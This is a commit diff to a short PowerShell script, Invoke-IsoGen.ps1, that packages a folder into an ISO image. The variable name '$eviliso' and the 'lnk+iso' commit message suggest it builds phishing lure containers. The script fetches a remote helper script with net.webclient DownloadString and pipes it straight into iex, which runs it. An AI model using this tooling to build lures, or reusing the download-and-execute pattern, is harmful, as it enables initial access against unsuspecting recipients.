0ab5fdd9b8b5ba70f0c4abe1d0e293fe7f6da5f1
thelikes <thelikes@github.com>
2022-10-31 10:56:38 -0400

    update powershell lnk+iso generation

--- psh/Invoke-IsoGen.ps1
+++ psh/Invoke-IsoGen.ps1
@@ -1,11 +1,13 @@
 ﻿# source: https://gist.githubusercontent.com/mgraeber-rc/a780834c983bc0d53121c39c276bd9f3/raw/94e9e4b685f03bb0dadc5a6516948c1c55c5e080/SimulateInternetZoneTest.ps1
 
-# Usage: create a directory and populate its contents with files intended to be enclosed in the ISO/IMG; configure the image name, parcel title, and iso directory
+# Usage:
+# 1) create a directory and populate its contents with files intended to be enclosed in the ISO/IMG
+# 2) configure the image name, parcel title, and iso directory
+# 3) run
 $eviliso = "Documents.iso"
 $isodir = "Documents"
 $parceltitle = "Documents"
 
 # Create an ISO file from the $isodir directory.
-# New-IsoFile from: https://github.com/wikijm/PowerShell-AdminScripts/blob/master/Miscellaneous/New-IsoFile.ps1
 (New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/wikijm/PowerShell-AdminScripts/master/Miscellaneous/New-IsoFile.ps1')|iex
 ls -Force $isodir | New-IsoFile -Path $eviliso -Media CDR -Title $parceltitle
